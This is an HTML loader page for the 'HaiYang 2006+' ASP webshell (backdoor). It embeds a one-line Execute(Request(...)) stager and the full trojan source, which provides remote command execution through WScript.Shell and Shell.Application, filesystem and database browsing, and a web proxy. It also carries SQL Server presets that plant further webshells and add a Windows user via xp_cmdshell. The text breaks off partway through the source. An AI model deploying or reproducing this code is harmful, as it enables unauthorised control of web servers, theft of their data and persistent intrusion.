<html><head><meta http-equiv="Content-Type" content="text/html; charset=gb2312"><title>海阳2006+后门执行脚本</title></head><body><style>BODY {	FONT-SIZE: 9pt;	COLOR: #000000;	FONT-FAMILY: "Courier New";scrollbar-face-color:#E4E4F3;	scrollbar-highlight-color:#FFFFFF;	scrollbar-3dlight-color:#E4E4F3;scrollbar-darkshadow-color:#9C9CD3;	scrollbar-shadow-color:#E4E4F3;	scrollbar-arrow-color:#4444B3;scrollbar-track-color:#EFEFEF;}TABLE {	FONT-SIZE: 9pt;	FONT-FAMILY: "Courier New";	BORDER-COLLAPSE: collapse;border-top-width: 1px;	border-right-width: 1px;	border-bottom-width: 1px;	border-left-width: 1px;border-top-style:solid;	border-right-style: none;	border-bottom-style: none;	border-left-style: solid;	border-top-color: #d8d8f0;border-right-color: #d8d8f0;	border-bottom-color: #d8d8f0;	border-left-color: #d8d8f0;}.tr {	font-family: "Courier New";	font-size: 9pt;	background-color: #e4e4f3;	text-align: center;}.td {	font-family: "Courier New";	font-size: 9pt;	background-color: #f9f9fd;}.warningColor {	font-family: "Courier New";	font-size: 9pt;	color: #ff0000;}input {	font-family: "Courier New";	BORDER-TOP-WIDTH: 1px;	BORDER-LEFT-WIDTH: 1px;	FONT-SIZE: 12px;	BORDER-BOTTOM-WIDTH: 1px;BORDER-RIGHT-WIDTH: 1px;	color: #000000;}textarea {	font-family: "Courier New";	BORDER-TOP-WIDTH: 1px;	BORDER-LEFT-WIDTH: 1px;	FONT-SIZE: 12px;	BORDER-BOTTOM-WIDTH: 1px;	BORDER-RIGHT-WIDTH: 1px;	color: #000000;}A:link {	FONT-SIZE: 9pt; 	COLOR: #000000;	FONT-FAMILY: "Courier New"; 	TEXT-DECORATION: none;}tr {	font-family: "Courier New";	font-size: 9pt;	line-height: 18px;}td {	font-family: "Courier New";	font-size: 9pt;	border-top-width: 1px;	border-right-width: 1px;	border-bottom-width: 1px;	border-left-width: 1px;	border-top-style: none;	border-right-style: solid;	border-bottom-style: solid;	border-left-style: none;	border-top-color: #d8d8f0;	border-right-color: #d8d8f0;	border-bottom-color: #d8d8f0;	border-left-color: #d8d8f0;}.trHead {	font-family: "Courier New";	font-size: 9pt;	background-color: #e4e4f3;	line-height: 3px;}.inputLogin {	font-family: "Courier New";	font-size: 9pt;	border: 1px solid #d8d8f0;	background-color: #f9f9fd;	vertical-align: bottom;}</style><table width="760" border="0" align="center" cellpadding="0" cellspacing="0"><form id=frm method="post" target="_blank"><tr><td height="22" class="td"> &nbsp;海阳2006+后门执行脚本 </td></tr><tr><td class="trHead">&nbsp;</td></tr><tr><td height="18" align="center" class="td">&nbsp;表单提交地址: <input name="theAction" type="text" id="theAction" value="{$SendTo}" size="60"> <input name="Submit422" type="button" class="inputLogin" onClick="this.form.fileContent.rows+=10;" value="+"> <input name="Submit42" type="button" class="inputLogin" onClick="if(this.form.fileContent.rows>11){this.form.fileContent.rows-=10;}" value="-"></td></tr><tr><td align="center" class="td"><input type=hidden name="{$ThePass}" id="sharp" value="Execute(&quot;Session(&quot;&quot;{$ThePass}&quot;&quot;)=Request(&quot;&quot;fileContent&quot;&quot;):Execute(Session(&quot;&quot;{$ThePass}&quot;&quot;))&quot;)"><textarea name="fileContent" cols="80" rows="30">Option Explicit
Response.Buffer = True

Dim i, url, conn, sUrlB, theAct, thePath, rootPath, PageSize, aspPath, bOtherUser, sSqlSelect, sImage
Dim sUrl, accessStr, PageName, sysFileList, isSqlServer, sPacketName, oFso, oShl, oWshl, sFooter, sHeader
bOtherUser = False		''是否需要其它NT用户身份登录

If bOtherUser = True And Trim(Request.ServerVariables("AUTH_USER")) = "" Then
	Response.Status = "401 Unauthorized"
	Response.Addheader "WWW-AuThenticate", "BASIC"
	If Request.ServerVariables("AUTH_USER") = "" Then Response.End()
End If

theAct = GetPost("theAct")
PageSize = 20 ''默认每页记录数
isSqlServer = False
rootPath = Server.MapPath("/")
PageName = GetPost("PageName")
url = Request.ServerVariables("URL") ''当前页的相对路径
sPacketName = "Packet.mdb" ''文件包默认文件名
thePath = Replace(GetPost("thePath"), "\\", "\")
aspPath = Replace(Server.MapPath(".") &amp; "\~86.tmp", "\\", "\") ''系统临时文件
sysFileList = "$" &amp; sPacketName &amp; "$" &amp; Left(sPacketName, InStrRev(sPacketName, ".") - 1) &amp; ".ldb$"
accessStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source={$dbSource};User Id={$userId};Jet OLEDB:Database Password=""{$passWord}"";"
sFooter = "&lt;tr>&lt;td class=trHead colspan=2>&amp;nbsp;&lt;/td>&lt;/tr>&lt;tr>&lt;td align=right class=td colspan=2>Powered By Marcos 2005.11&amp;nbsp;&lt;/td>&lt;/tr>&lt;/table>"
sHeader = "&lt;table width=750 border=1>&lt;tr>&lt;td colspan=2 class=td>&lt;font face=webdings>8&lt;/font> {$s}&lt;/td>&lt;/tr>&lt;tr>&lt;td colspan=2 class=trHead>&amp;nbsp;&lt;/td>&lt;/tr>"
sSqlSelect = "&lt;select onchange=""if(this.form.sqlB)this.form.sqlB.value=this.value;else this.form.sql.value=this.value;"">&lt;option value=''>SQL Server常用命令列表&lt;option value=""Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^> > c:\1.asp';"">SP_OAMethod执行命令" &amp; _
			 "&lt;option value=""Exec XP_CMDShell 'net user lcx lcx /add'"">XP_CMDShell执行命令&lt;option value=""sp_makewebtask @outputfile='d:\bbs\cd.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))" &amp; Chr(37) &amp; ">''' "">sp_makewebtask写文件" &amp; _
			 "&lt;option value=""dbcc addextendedproc ('sp_OACreate','odsole70.dll')"">恢复sp_OACreate过程&lt;option value=""dbcc addextendedproc ('xp_cmdshell','xplog70.dll')"">恢复xp_cmdshell&lt;/select>&lt;br />"

Const s = "" ''登录标志
Const m = "HYTop2006+" ''Session标志
Const isDebugMode = False 'False,True''是否调试模式
Const userPassword = "02200200251001" ''登录密码
Const imageFileExt = "$gif$jpg$bmp$" ''图像后缀列表
Const editableFileExt = "$vbs$log$asp$txt$php$ini$inc$htm$html$xml$conf$config$jsp$java$htt$lst$aspx$php3$php4$js$css$bat$asa$"

Sub Echo(sStr)
	Response.Write sStr
End Sub

Sub IsIn()
	If Session(m &amp; "userPassword") &lt;> userPassword Then
		Echo "&lt;script>alert('没有权限的访问,请先登录!');location.href='" &amp; url &amp; "';&lt;/script>"
		Response.End()
	End If
End Sub

Function IIf(var, val1, val2)
	If var = True Then IIf = val1 Else IIf = val2
End Function

Sub RedirectTo(url)
	Response.Redirect(url)
End Sub

Function StrEncode(str)
	str = HtmlEncode(str)
	str = Replace(str, " ", "&amp;nbsp;")
	str = Replace(str, "	", "&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;")
	str = Replace(str, vbNewLine, "&lt;br />")
	StrEncode = str
End Function

Sub CreateObj(oFso, oShl, oWshl)
	On Error Resume Next

	Set oWshl = Server.CreateObject("WScript.Shell")
	Set oShl = Server.CreateObject("Shell.Application")
	Set oFso = Server.CreateObject("Scripting.FileSystemObject")

	If IsEmpty(oShl) Then Set oShl = sa
	If IsEmpty(oFso) Then Set oFso = fso
	If IsEmpty(oWshl) Then Set oWshl = ws

	If Err Then Err.Clear
End Sub

Function StreamLoadFromFile(sPath)
	Dim oStream
	If isDebugMode = False Then On Error Resume Next

	Set oStream = Server.CreateObject("adodb.stream")
	With oStream
		.Type = 2
		.Mode = 3
		.Open
		.LoadFromFile sPath
		If Request("PageName") &lt;> "TxtSearcher" Then ChkErr(Err)
		.Charset = "gb2312"
		.Position = 2
		StreamLoadFromFile = .ReadText()
		.Close
	End With
	Set oStream = Nothing
End Function

Sub JavaScript(sStr)
	Response.Write(vbNewLine &amp; "&lt;script type=""text/javascript"">" &amp; sStr &amp; "&lt;/script>" &amp; vbNewLine)
End Sub

Function GetPost(var)
	Dim val
	If Request.QueryString("PageName") = "PageUpload" Then
		PageName = "PageUpload"
		Exit Function
	End If
	val = RTrim(Request.Form(var))
	If val = "" Then val = RTrim(Request.QueryString(var))
	GetPost = val
End Function

Function HtmlEncode(str)
	If IsNull(str) Then Exit Function
	HtmlEncode = Server.HTMLEncode(str)
End Function

Function UrlEncode(str)
	If IsNull(str) Then Exit Function
	UrlEncode = Server.URLEncode(str)
End Function

Sub ShowTitle(str)
	Response.Write "&lt;title>" &amp; str &amp; " - 海阳顶端网ASP木马＠2006PLUS - By Marcos&lt;/title>"
	Response.Write "&lt;meta http-equiv='Content-Type' content='text/html; charset=gb2312'>"
End Sub

Function GetTheSize(n)
	Dim i, aSize(4)
	aSize(0) = "B"
	aSize(1) = "KB"
	aSize(2) = "MB"
	aSize(3) = "GB"
	aSize(4) = "TB"
	While(n / 1024 >= 1)
		n = n / 1024
		i = i + 1
	WEnd
	GetTheSize = Fix(n * 100) / 100 &amp; " " &amp; aSize(i)
End Function

Sub ShowErr(str)
	Dim i, aStr
	str = HtmlEncode(str)
	aStr = Split(str, "$$")

	Echo "&lt;font size=2>"
	Echo "出错信息:&lt;br/>&lt;br/>"
	For i = 0 To UBound(aStr)
		Echo "&amp;nbsp;&amp;nbsp;" &amp; (i + 1) &amp; ". " &amp; aStr(i) &amp; "&lt;br/>"
	Next
	Echo "&lt;/font>"

	Response.End()
End Sub

Sub CreateFolder(sPath)
	Dim i
	i = InStr(Mid(sPath, 4), "\") + 3
	Do While i > 0
		If oFso.FolderExists(Left(sPath, i)) = False Then oFso.CreateFolder(Left(sPath, i - 1))
		If InStr(Mid(sPath, i + 1), "\") Then i = i + InStr(Mid(sPath, i + 1), "\") Else i = 0
	Loop
End Sub

Sub AlertThenClose(str)
	If str = "" Then
		Response.Write "&lt;script>window.close();&lt;/script>"
	 Else
		Response.Write "&lt;script>alert(""" &amp; str &amp; """);window.close();&lt;/script>"
	End If
End Sub

Sub ChkErr(Err)
	If Err Then
		Echo "&lt;hr style='color:#d8d8f0;'/>&lt;font size=2>&lt;li>错误: " &amp; Err.Description &amp; "&lt;/li>&lt;li>错误源: " &amp; Err.Source &amp; "&lt;/li>&lt;br/>"
		Echo "&lt;hr style='color:#d8d8f0;'/>&amp;nbsp;By Marcos 2005.11&lt;/font>"
		Err.Clear
		Response.End
	End If
End Sub

Sub TopMenu()
	Echo "&lt;div" &amp; IIf(PageName = s, " align=center", "") &amp; ">"
	Echo "&lt;form method=post name=formp action=""" &amp; url &amp; """>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo "&lt;select name=PageName onchange=changePage(this);" &amp; IIf(PageName = s, " size=17 multiple='multiple'", "") &amp; ">"
	Echo "&lt;option value='" &amp; s &amp; "'>请选择功能页面&lt;/option>"
	Echo "&lt;option value=PageCheck>服务器信息探针&lt;/option>"
	Echo "&lt;option value=PageServiceList>系统服务列表&lt;/option>"
	Echo "&lt;option value=PageUserList>系统用户(组)列表&lt;/option>"
	Echo "&lt;option value=PageFso>FSO文件浏览操作器&lt;/option>"
	Echo "&lt;option value=PageApp>APP文件浏览操作器&lt;/option>"
	Echo "&lt;option value=PageDBTool>数据库操作器&lt;/option>"
	Echo "&lt;option value=PagePack>文件夹打包/解开器&lt;/option>"
	Echo "&lt;option value=PageUpload>批量文件上传&lt;/option>"
	Echo "&lt;option value=PageSearch>文本文件搜索器&lt;/option>"
	Echo "&lt;option value=PageWebProxy>HTTP协议网页代理&lt;/option>"
	Echo "&lt;option value=PageExecute>自定义ASP语句运行&lt;/option>"
	Echo "&lt;option value=PageCSInfo>客户端服务器交互信息&lt;/option>"
	Echo "&lt;option value=PageWsCmdRun>WScript.Shell命令行操作&lt;/option>"
	Echo "&lt;option value=PageSaCmdRun>Shell.Application命令行&lt;/option>"
	Echo "&lt;option value=PageOtherTools>其它一些零碎的小工具&lt;/option>"
	Echo "&lt;option value=PageOut>退出系统&lt;/option>"
	Echo "&lt;/select>"
	Echo "&lt;/form>"
	Echo "&lt;script language=javascript>"
	Echo "function document.onreadystatechange(){if(document.readyState != 'complete') return;" &amp; vbNewLine
	Echo "formp.PageName.value='" &amp; PageName &amp; "';}"
	Echo "function changePage(obj){"
	Echo "	if(obj.value=='PageOut')"
	Echo "		if(!confirm('确认要退出系统吗?'))return;"
	Echo "	if(obj.value=='PageWebProxy')obj.form.target='_blank';"
	Echo "	obj.form.submit();obj.form.target='';" &amp; vbNewLine
	Echo "	if(obj.value!='PageWebProxy' &amp;&amp; obj.value!='PageOut')obj.disabled=true;"
	Echo "}"
	Echo "&lt;/script>"
	Echo "&lt;/div>"
End Sub

Rem ++++++++++++++++++++++++++++++++++++
Rem 		以下是页面选择部分
Rem ++++++++++++++++++++++++++++++++++++

Call CreateObj(oFso, oShl, oWshl)
Response.Clear
PageOther()
If PageName &lt;> "" And PageName &lt;> s Then
	IsIn()
	TopMenu()
End If

Select Case PageName
	Case "PageSearch"
		PageSearch()
	Case "PageServiceList"
		PageServiceList()
	Case "PageUserList"
		PageUserList()
	Case "PageCheck"
		PageCheck()
	Case "PageFso"
		PageFso()
	Case "PageApp"
		PageApp()
	Case "PageDBTool"
		PageDBTool()
	Case "PageUpload"
		PageUpload()
	Case "PageWsCmdRun"
		PageWsCmdRun()
	Case "PageSaCmdRun"
		PageSaCmdRun()
	Case "PagePack"
		PagePack()
	Case "PageExecute"
		PageExecute()
	Case "PageCSInfo"
		PageCSInfo()
	Case "PageOtherTools"
		PageOtherTools()
	Case "PageWebProxy"
		PageWebProxy()
	Case s, "PageOut"
		PageLogin()
End Select

Set oFso = Nothing
Set oShl = Nothing
Set oWshl = Nothing

Rem +++++++++++++++++++++++++++++++++++++
Rem 		以下是各功能模块部分
Rem +++++++++++++++++++++++++++++++++++++

Sub PageWsCmdRun()
	Dim cmdStr, cmdPath, cmdResult
	cmdStr = Request("cmdStr")
	cmdPath = Request("cmdPath")
	
	ShowTitle("WScript.Shell命令行操作")
	
	If cmdPath = "" Then
		cmdPath = "cmd.exe"
	End If
	
	If theAct = "PackIt" And cmdStr &lt;> "" Then
		Server.ScriptTimeOut = 999999
		cmdStr = "c:\progra~1\WinRAR\Rar.exe a """ &amp; cmdStr &amp; "\Packet.rar"" """ &amp; cmdStr &amp; """"
		cmdStr = Replace(cmdStr, "\\", "\")
	End If

	If cmdStr &lt;> "" Then
		If InStr(LCase(cmdPath), "cmd.exe") > 0 Then
			cmdResult = DoWsCmdRun(cmdPath &amp; " /c " &amp; cmdStr)
		 Else
			If LCase(cmdPath) = "wscriptshell" Then
				cmdResult = DoWsCmdRun(cmdStr)
			 Else
				cmdResult = DoWsCmdRun(cmdPath &amp; " " &amp; cmdStr)
			End If
		End If
	End If
	
	Echo "&lt;body onload=""document.forms[1].cmdStr.focus();"">"
	Echo "&lt;form method=post onSubmit='this.Submit.disabled=true'>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo "&lt;input type=hidden name=PageName value='PageWsCmdRun' />"
	Echo Replace(sHeader, "{$s}", "WScript.Shell命令行操作")
	Echo "&lt;tr>&lt;td colspan=2>&amp;nbsp;路径: &lt;input name=cmdPath type=text id=cmdPath value=""" &amp; HtmlEncode(cmdPath) &amp; """ size=50> "
	Echo "&lt;input type=button name=Submit2 value=使用WScript.Shell onClick=""this.form.cmdPath.value='WScriptShell';"">&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td colspan=2>&amp;nbsp;命令/参数: &lt;input name=cmdStr type=text id=cmdStr value=""" &amp; HtmlEncode(cmdStr) &amp; """ size=62> "
	Echo "&lt;input type=submit name=Submit value=' 运行 '>&lt;/td>&lt;tr>"
	Echo "&lt;tr>&lt;td colspan=2 style='line-height:21px;'>&amp;nbsp;注:请只在这里执行单步程序(程序执行开始到结束不需要人工干预),不然本程序会无法正常工作,并且在服务器生成一个不可结束的进程.&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td colspan=2>&amp;nbsp;&lt;textarea id=cmdResult style='width:735px;height:400px;'>"
	Echo HtmlEncode(cmdResult)
	Echo "&lt;/textarea>&lt;/td>&lt;/tr>"
	Echo sFooter
	Echo "&lt;/form>"
	Echo "&lt;/body>"
End Sub

Function DoWsCmdRun(cmdStr)
	If isDebugMode = False Then On Error Resume Next
	Dim oFile
	
	doWsCmdRun = oWshl.Exec(cmdStr).StdOut.ReadAll()
	If Err Then
		Echo Err.Description &amp; "&lt;br>"
		Err.Clear
		oWshl.Run cmdStr &amp; " > " &amp; aspPath, 0, True
		Set oFile = oFso.OpenTextFile(aspPath)
		DoWsCmdRun = oFile.RealAll()
		If Err Then
			Echo Err.Description &amp; "&lt;br>"
			Err.Clear
			DoWsCmdRun = StreamLoadFromFile(aspPath)
		End If
	End If
End Function

Sub PageSaCmdRun()
	If isDebugMode = False Then On Error Resume Next
	Dim theFile, appPath, appName, appArgs
	
	ShowTitle("Shell.Application 命令行操作")
	
	appPath = Trim(Request("appPath"))
	appName = Trim(Request("appName"))
	appArgs = Trim(Request("appArgs"))

	If theAct = "doAct" Then
		If appName = "" Then appName = "cmd.exe"
	
		If appPath &lt;> "" And Right(appPath, 1) &lt;> "\" Then
			appPath = appPath &amp; "\"
		End If
	
		If LCase(appName) = "cmd.exe" And appArgs &lt;> "" Then
			If LCase(Left(appArgs, 2)) &lt;> "/c" Then
				appArgs = "/c " &amp; appArgs
			End If
		Else
			If LCase(appName) = "cmd.exe" And appArgs = "" Then
				appArgs = "/c "
			End If
		End If

		oShl.ShellExecute appName, appArgs, appPath, "", 0
'			Response.Write("oShl.ShellExecute " &amp; appName &amp; ", " &amp; appArgs &amp; ", " &amp; appPath &amp; ", """", 0")
		chkErr(Err)
	End If
	
	If theAct = "readResult" Then
		Err.Clear
		Response.Clear
		Response.Write("&lt;style>body{font-size:12px;}&lt;/style>" &amp; vbNewLine)
		Echo StrEncode(streamLoadFromFile(aspPath))
		If Err Then
			Err.Clear
			Set theFile = fsoX.OpenTextFile(aspPath)
			Echo StrEncode(theFile.ReadAll())
			Set theFile = Nothing
		End If
		Response.End()
	End If
	
	Echo "&lt;body onload=""document.forms[1].appArgs.focus();setTimeout('wsLoadIFrame();', 3900);"">"
	Echo "&lt;form method=post onSubmit='this.Submit.disabled=true'>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo "&lt;input type=hidden name=theAct value=doAct>"
	Echo "&lt;input type=hidden name=PageName value=PageSaCmdRun />"
	Echo "&lt;input type=hidden name=aspPath value=""" &amp; HtmlEncode(aspPath) &amp; """>"
	Echo Replace(sHeader, "{$s}", "Shell.Application 命令行操作")
	Echo "&lt;tr>&lt;td colspan=2>&amp;nbsp;所在路径: &lt;input name=appPath type=text id=appPath value=""" &amp; HtmlEncode(appPath) &amp; """ size=62>&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td colspan=2>&amp;nbsp;程序文件: &lt;input name=appName type=text id=appName value=""" &amp; HtmlEncode(appName) &amp; """ size=62> "
	Echo "&lt;input type=button name=Submit4 value=' 回显 ' onClick=""this.form.appArgs.value+=' > '+this.form.aspPath.value;"">&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td colspan=2>&amp;nbsp;命令参数: &lt;input name=appArgs type=text id=appArgs value=""" &amp; HtmlEncode(appArgs) &amp; """ size=62> "
	Echo "&lt;input type=submit name=Submit value=' 运行 '>&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td colspan=2>&amp;nbsp;注: 只有命令行程序在CMD.EXE运行环境下才可以进行临时文件回显(利用"">""符号),其它程序只能执行不能回显.&lt;br/>"
	Echo "&amp;nbsp;由于命令执行时间同网页刷新时间不同步,所以有些执行时间长的程序结果需要手动刷新下面的iframe才能得到.回显后记得删除临时文件.&lt;/td>&lt;/tr>"
	Echo "&lt;tr>&lt;td colspan=2 style='padding-top:6px;'>&amp;nbsp;&lt;iframe id=cmdResult style='width:733px;height:400px;'>"
	Echo "&lt;/iframe>&lt;/td>&lt;/tr>"
	Echo sFooter
	Echo "&lt;/form>"
	Echo "&lt;/body>"
End Sub

Sub PageSearch()
	Dim strKey, strPath
	strKey = GetPost("Key")
	Server.ScriptTimeout = 5000
	If thePath = "" Then thePath = rootPath
	
	ShowTitle("文本文件搜索器")
	
	SearchTable(strKey)
	
	If theAct &lt;> "" And strKey &lt;> "" Then
		SearchIt(strKey)
	End If
End Sub

Sub SearchTable(strKey)
	Echo "&lt;form method=post action='" &amp; url &amp; "'>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo "&lt;input type=hidden value=PageSearch name=PageName>"
	Echo Replace(sHeader, "{$s}", "文本文件搜索器(需FSO支持)")
	Echo "&lt;tr>"
	Echo "&lt;td>&amp;nbsp;路径&lt;/td>"
	Echo "&lt;td>&amp;nbsp;&lt;input name=thePath type=text id=thePath value="""
	Echo HtmlEncode(thePath)
	Echo """ style='width:360px;'>"
	Echo "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td width='20%'>&amp;nbsp;关键字&lt;/td>"
	Echo "&lt;td>&amp;nbsp;&lt;input name=Key type=text value='" &amp; HtmlEncode(strKey) &amp; "' id=Key style='width:400px;'> "
	Echo "&lt;select name=theAct id=theAct>"
	Echo "&lt;option value=FileName selected>仅文件名&lt;/option>"
	Echo "&lt;option value=FileContent>仅文本内容&lt;/option>"
	Echo "&lt;option value=Both>两者都&lt;/option>"
	Echo "&lt;/select>"
	Echo " &lt;input type=submit name=Submit value=提交> &lt;/td>"
	Echo "&lt;/tr>"
	Echo sFooter
	Echo "&lt;/form>"
End Sub

Sub SearchIt(key)
	Dim strPath, theFolder
	Response.Buffer = True
	strPath = thePath
	If oFso.FolderExists(strPath) = False Then
		ShowErr(thePath &amp; " 目录不存在或者不允许访问!")
	End If
	Set theFolder = oFso.GetFolder(strPath)
	
	Echo "&lt;br/>&lt;div style='width:750;border:1px solid #d8d8f0;'>"

	Select Case theAct
		Case "Both"
			Call SearchFolder(theFolder, key, 1)
		Case "FileName"
			Call SearchFolder(theFolder, key, 2)
		Case "FileContent"
			Call SearchFolder(theFolder, key, 3)
	End Select
	
	Echo "&lt;/div>"
	
	Set theFolder = Nothing
End Sub

Sub SearchFolder(folder, key, flag)
	Dim ext, title, theFile, theFolder
	
	For Each theFile In folder.Files
		ext = LCase(oFso.GetExtensionName(theFile.Path))
		If flag = 1 Or flag = 2 Then
			If InStr(LCase(theFile.Name), LCase(key)) > 0 Then Echo FileLink(theFile, "")
		End If
		If flag = 1 Or flag = 3 Then
			If InStr(EditableFileExt, "$" &amp; ext &amp; "$") > 0 Then
				If SearchFile(theFile, key, title) Then Echo FileLink(theFile, title)
			End If
		End If
	Next

	Response.Flush()

	For Each theFolder In folder.SubFolders
		Call SearchFolder(theFolder, key, flag)
	Next
End Sub

Function SearchFile(f, s, title)
	Dim theFile, content, pos1, pos2
	If isDebugMode = False Then On Error Resume Next

	Set theFile = oFso.OpenTextFile(f.Path)
	content = theFile.ReadAll()
	theFile.Close
	Set theFile = Nothing

	If Err Then Err.Clear

	SearchFile = InStr(1, content, s, 1) 
	If SearchFile > 0 Then
		pos1 = InStr(1, content, "&lt;TITLE>", 1)
		pos2 = InStr(1, content, "&lt;/TITLE>", 1)
		title = ""
		If pos1 > 0 And pos2 > 0 Then
			title = Mid(content, pos1 + 7, pos2 - pos1 - 7)
		End If
	End If
End Function

Function FileLink(file, title)
	fileLink = file.Path
	If title = "" Then
		title = file.Name
	End If
	fileLink = "&amp;nbsp;&lt;font color=ff0000>" &amp; title &amp; "&lt;/font> " &amp; fileLink &amp; "&lt;br/>"
End Function

Sub PageCheck()
	ShowTitle("服务器信息探针")
	Response.Flush()
	InfoCheck()
	Response.Flush()
	ObjCheck()
	Response.Flush()
	GetSrvDrvInfo()
	Response.Flush()
End Sub

Sub InfoCheck()
	Dim aCheck(7), sExEnvList, aExEnvList
	If isDebugMode = False Then On Error Resume Next

	sExEnvList = "ClusterLog$SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$Path$PATHEXT$PROCESSOR_ARCHITECTURE$" &amp; _
				 "PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
	aExEnvList = Split(sExEnvList, "$")

	aCheck(0) = Server.ScriptTimeOut() &amp; "(秒)"
	aCheck(1) = FormatDateTime(Now(), 0)
	aCheck(2) = Request.ServerVariables("SERVER_NAME")
	aCheck(2) = aCheck(2) &amp; ", " &amp; Request.ServerVariables("LOCAL_ADDR")
	aCheck(2) = aCheck(2) &amp; ":" &amp; Request.ServerVariables("SERVER_PORT")
	aCheck(3) = Request.ServerVariables("OS")
	aCheck(3) = IIf(aCheck(3) = "", "Windows2003", aCheck(3)) &amp; ", " &amp; Request.ServerVariables("SERVER_SOFTWARE")
	aCheck(3) = aCheck(3) &amp; ", " &amp; ScriptEngine &amp; "/" &amp; ScriptEngineMajorVersion &amp; "." &amp; ScriptEngineMinorVersion &amp; "." &amp; ScriptEngineBuildVersion
	aCheck(4) = rootPath
	aCheck(4) = aCheck(4) &amp; ", " &amp; GetTheSize(oFso.GetFolder(rootPath).Size)
	aCheck(5) = "Path: " &amp; Request.ServerVariables("PATH_TRANSLATED") &amp; "&lt;br />"
	aCheck(5) = aCheck(5) &amp; "&amp;nbsp;Url : http://" &amp; Request.ServerVariables("SERVER_NAME") &amp; Request.ServerVariables("Url")
	aCheck(6) = "变量数: " &amp; Application.Contents.Count() &amp; ","
	aCheck(6) = aCheck(6) &amp; " 会话数: " &amp; Session.Contents.Count &amp; ","
	aCheck(6) = aCheck(6) &amp; " 当前会话ID: " &amp; Session.SessionId() &amp; "&lt;br />"
	aCheck(6) = aCheck(6) &amp; "&amp;nbsp;服务器内存: " &amp; GetTheSize(oShl.GetSystemInformation("PhysicalMemoryInstalled")) &amp; ","
	aCheck(6) = aCheck(6) &amp; "&amp;nbsp;计" &amp; oWshl.Environment("SYSTEM")("NUMBER_OF_PROCESSORS") &amp; "个CPU(" &amp; oWshl.Environment("SYSTEM")("PROCESSOR_IDENTIFIER") &amp; ")"

	Echo Replace(sHeader, "{$s}", "服务器基本信息")
	Echo "&lt;tr class=td>"
	Echo "&lt;td width='20%'>&amp;nbsp;项目&lt;/td>"
	Echo "&lt;td>&amp;nbsp;值&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td>&amp;nbsp;默认超时&lt;/td>"
	Echo "&lt;td>&amp;nbsp;" &amp; aCheck(0) &amp; "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td>&amp;nbsp;当前时间&lt;/td>"
	Echo "&lt;td>&amp;nbsp;" &amp; aCheck(1) &amp; "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td>&amp;nbsp;服务器名&lt;/td>"
	Echo "&lt;td>&amp;nbsp;" &amp; aCheck(2) &amp; "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td>&amp;nbsp;软件环境&lt;/td>"
	Echo "&lt;td>&amp;nbsp;" &amp; aCheck(3) &amp; "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td>&amp;nbsp;站点目录&lt;/td>"
	Echo "&lt;td>&amp;nbsp;" &amp; aCheck(4) &amp; "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td>&amp;nbsp;当前路径&lt;/td>"
	Echo "&lt;td>&amp;nbsp;" &amp; aCheck(5) &amp; "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>&lt;td>&amp;nbsp;终端服务端口&lt;br />&amp;nbsp;及自动登录信息&lt;/td>&lt;td>"
	GetTerminalInfo()
	Echo "&lt;/td>&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td>&amp;nbsp;其它&lt;/td>"
	Echo "&lt;td>&amp;nbsp;" &amp; aCheck(6) &amp; "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td>&amp;nbsp;环境变量&lt;/td>"
	Echo "&lt;td style='padding-left:7px;'>"
	For i = 0 To UBound(aExEnvList)
		Echo aExEnvList(i) &amp; ": " &amp; oWshl.ExpandEnvironmentStrings("%" &amp; aExEnvList(i) &amp; "%") &amp; "&lt;br />"
	Next
	Echo "&lt;/td>"
	Echo "&lt;/tr>"
	Echo sFooter
End Sub

Sub GetSrvDrvInfo()
	If isDebugMode = False Then On Error Resume Next
	Dim oTheDrive
	
	Echo "&lt;br />"
	Echo Replace(Replace(sHeader, "{$s}", "服务器磁盘信息"), "=2", "=6")
	Echo "&lt;tr class=td align=center>"
	Echo "&lt;td>盘符&lt;/td>"
	Echo "&lt;td>类型&lt;/td>"
	Echo "&lt;td>卷标&lt;/td>"
	Echo "&lt;td>文件系统&lt;/td>"
	Echo "&lt;td>可用空间&lt;/td>"
	Echo "&lt;td>总空间&lt;/td>"
	Echo "&lt;/tr>"
	
	For Each oTheDrive In oFso.Drives
		Echo "&lt;tr align=center>&lt;td>"
		Echo oTheDrive.DriveLetter
		Echo "&lt;/td>&lt;td>"
		Echo GetDriveType(oTheDrive.DriveType)
		Echo "&lt;/td>&lt;td>"
		Echo oTheDrive.VolumeName
		Echo "&lt;/td>&lt;td>"
		Echo oTheDrive.FileSystem
		Echo "&lt;/td>&lt;td>"
